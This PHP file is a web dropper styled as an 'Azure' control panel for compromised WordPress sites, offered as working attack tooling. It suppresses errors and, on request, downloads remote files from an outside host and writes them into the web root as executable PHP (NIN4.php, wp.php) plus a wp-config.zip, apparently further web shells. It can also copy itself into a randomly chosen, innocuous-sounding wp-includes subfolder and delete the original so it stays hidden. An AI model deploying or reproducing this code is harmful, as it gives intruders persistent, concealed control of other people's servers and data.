<?php
@error_reporting(0);
@set_time_limit(0);

$msg = [];
$self = basename(__FILE__);
$currentDir = __DIR__ . '/';

$folders = ['certificates', 'ID3', 'images', 'js', 'fonts', 'blocks', 'customize', 'SimplePie', 'Requests'];
$rand = $folders[array_rand($folders)];
$mvDir = $_SERVER['DOCUMENT_ROOT'] . '/wp-includes/' . $rand . '/';

session_start();
if (isset($_SESSION['mv_path'])) {
    $mvDir = $_SESSION['mv_path'];
    $rand = basename(rtrim($_SESSION['mv_path'], '/'));
} else {
    $_SESSION['mv_path'] = $mvDir;
}

function grab($url, $file) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        $fp = fopen($file, 'wb');
        if (!$fp) return false;
        curl_setopt_array($ch, [
            CURLOPT_FILE => $fp,
            CURLOPT_TIMEOUT => 40,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false
        ]);
        curl_exec($ch);
        curl_close($ch);
        fclose($fp);
        return file_exists($file) && filesize($file) > 0;
    }
    $content = @file_get_contents($url);
    if ($content === false) return false;
    return file_put_contents($file, $content) !== false;
}

if (isset($_GET['mv'])) {
    @mkdir($mvDir, 0755, true);
    if (@copy(__FILE__, $mvDir . $self)) {
        @unlink(__FILE__);
        header('Location: /wp-includes/' . $rand . '/' . $self);
        exit;
    }
    $msg[] = [false, 'Move failed'];
}

if (isset($_GET['get'])) {
    $resources = [
        ['https://myzedd.tech/project/NIN4.txt', 'NIN4.php', 'NIN4'],
        ['https://myzedd.tech/project/wp.txt', 'wp.php', 'WP'],
        ['https://myzedd.tech/project/wp-config.zip', 'wp-config.zip', 'ZIP']
    ];
    
    foreach ($resources as $item) {
        $targetFile = $currentDir . $item[1];
        $success = grab($item[0], $targetFile);
        $msg[] = [$success, $item[2]];
    }
}

$webPath = str_replace($_SERVER['DOCUMENT_ROOT'], '', $currentDir);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Azure</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
    background:#0a1628;
    background-image:radial-gradient(circle at 20% 30%,rgba(59,130,246,0.08) 0%,transparent 50%),
                     radial-gradient(circle at 80% 70%,rgba(96,165,250,0.05) 0%,transparent 50%);
    font-family:system-ui,sans-serif;
    color:#e0f2fe;
    min-height:100vh;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:20px
}
.wrap{
    max-width:440px;
    width:100%
}
.header{
    background:#1e293b;
    border:1px solid #334155;
    border-radius:10px;
    padding:16px 20px;
    margin-bottom:20px;
    display:flex;
    justify-content:space-between;
    align-items:center
}
.title{
    font-size:16px;
    font-weight:600;
    color:#60a5fa
}
.badge{
    font-size:10px;
    padding:4px 10px;
    background:#0f172a;
    border:1px solid #334155;
    border-radius:12px;
    color:#94a3b8;
    text-transform:uppercase;
    letter-spacing:1px
}
.box{
    background:#1e293b;
    border:1px solid #334155;
    border-radius:10px;
    padding:18px;
    margin-bottom:14px
}
.label{
    font-size:11px;
    color:#94a3b8;
    margin-bottom:6px;
    text-transform:uppercase;
    letter-spacing:0.5px
}
.value{
    font-size:13px;
    color:#60a5fa;
    font-family:monospace;
    word-break:break-all
}
.log{
    background:#0f172a;
    border-left:3px solid #3b82f6;
    padding:10px 14px;
    margin-bottom:10px;
    border-radius:6px;
    font-size:13px;
    color:#cbd5e1
}
.log.ok{border-left-color:#10b981;color:#6ee7b7}
.log.ok::before{content:'✓ ';font-weight:bold}
.log.no{border-left-color:#ef4444;color:#fca5a5}
.log.no::before{content:'✗ ';font-weight:bold}
.btn{
    background:#3b82f6;
    color:#fff;
    padding:12px 20px;
    border:none;
    border-radius:8px;
    font-size:13px;
    font-weight:600;
    cursor:pointer;
    text-decoration:none;
    display:block;
    text-align:center;
    margin-bottom:10px;
    transition:all .2s;
    box-shadow:0 4px 14px rgba(59,130,246,0.3)
}
.btn:hover{
    background:#60a5fa;
    transform:translateY(-2px);
    box-shadow:0 6px 20px rgba(59,130,246,0.4)
}
.btn-sec{
    background:#0f172a;
    color:#60a5fa;
    border:1px solid #334155;
    box-shadow:none
}
.btn-sec:hover{
    background:#1e293b;
    border-color:#475569
}
hr{
    border:none;
    height:1px;
    background:linear-gradient(90deg,transparent,#334155,transparent);
    margin:16px 0
}
@media(max-width:500px){
    .wrap{padding:0}
    .header{padding:14px 16px}
}
</style>
</head>
<body>
<div class="wrap">

<div class="header">
    <div class="title">⚡ Azure</div>
    <div class="badge">Online</div>
</div>

<?php if(!empty($msg)): ?>
    <?php foreach($msg as $m): ?>
    <div class="log <?=$m[0]?'ok':'no'?>"><?=htmlspecialchars($m[1])?></div>
    <?php endforeach; ?>
    <hr>
<?php else: ?>
    <div class="box">
        <div class="label">Download Path</div>
        <div class="value"><?=htmlspecialchars($webPath)?></div>
    </div>
    <div class="box">
        <div class="label">Relocate Target</div>
        <div class="value">/wp-includes/<?=htmlspecialchars($rand)?>/</div>
    </div>
<?php endif; ?>

<a href="?get" class="btn">📥 Download Resources</a>

<hr>

<a href="<?=htmlspecialchars($webPath)?>NIN4.php" target="_blank" class="btn btn-sec">Open NIN4.php</a>
<a href="<?=htmlspecialchars($webPath)?>wp.php" target="_blank" class="btn btn-sec">Open wp.php</a>
<a href="<?=htmlspecialchars($webPath)?>wp-config.zip" target="_blank" class="btn btn-sec">Open wp-config.zip</a>

<hr>

<a href="?mv" class="btn" onclick="return confirm('Relocate this file?')">🚀 Relocate</a>

</div>
</body>
</html>